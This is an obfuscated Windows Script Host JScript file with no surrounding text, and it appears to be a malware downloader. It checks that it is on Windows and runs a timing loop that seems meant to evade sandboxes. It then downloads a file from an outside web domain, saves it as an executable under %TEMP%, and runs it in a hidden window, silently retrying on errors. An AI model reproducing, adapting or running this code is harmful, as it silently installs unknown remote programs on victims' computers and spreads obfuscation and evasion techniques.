var S = false;
var H = "Create"+"Object";
var CK = function B() {return WScript[H]("WScript"+".Shell");}(), TU = 11;
var M = "MSXML2"+".XMLHTTP";
var I = 2;
var A = I - 2;
function W(V0){CK["Run"](V0, A, A);};
function R(){return M + "";};
function V(NS, WW){A = A * 1; return NS - WW;};
function F(){return H;};
/*@cc_on
  @if (@_win32 || @_win64)
    S = true;
  @end
@*/
if (S)
{
var ZZ = "";
function NB(){return 22;};
var EI = 0; var JZ = 0;
function JL()
{
var G0 = new this["Date"]();
var G = G0["getUTCMilliseconds"]();
WScript["Sleep"](NB());
var G0 = new this["Date"]();
var OB = G0["getUTCMilliseconds"]();
WScript["Sleep"](NB());
var G0 = new this["Date"]();
var Y = G0["getUTCMilliseconds"]();
var EI = "WA";
EI = V(OB, G);
var JZ = "EN";
JZ = V(Y, OB);
ZZ = "open";
return V(EI, JZ);
}
var X = false;
var H0 = false;
for (var T = A; T < NB() * 1; T++){if (JL() != A){
X = true; 
JZ = "31" + 11 * EI + JZ; 
H0 = true; 
break;
}}
function P() {return ((X == true) && (X == H0)) ? 1 : A;};
if (X && P() && H0){
function IG() {return CK["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "IGa6CZuwRVQWpO.ex" + "e";};
 AM = R();
 WC = WScript[H](AM);
 var W0 = 1;
do { 
	for (;W0;){
	try {
		if (W0 == 1)
		{
			WC[ZZ]("GET", "http://drirenaeris.com.au/b7eir", false);
			WC["send"]();
			T0 = "Sleep";
			W0 = 2;
		}
		WScript[T0](NB() + 120); 
		if (WC["readystate"] < 2 * 2) continue;
		W0 = A;
		function OO(R0) {var TH = (1, 2, 3, 4, 5, R0); return TH;};
		B0 = WScript[F()]("ADODB.Stream");
		AM = B0;
		AM[ZZ]();
		AM["type"] = OO(1);
		AM["write"](WC["ResponseBody"]);
		B0["position"] = OO(A);
		AM["Save" + "ToFile"](IG(), 2);
		B0["cl"+"ose"]();
		O = IG();
		W(O);
	} catch(JL0){};};
}while (W0);
}
}

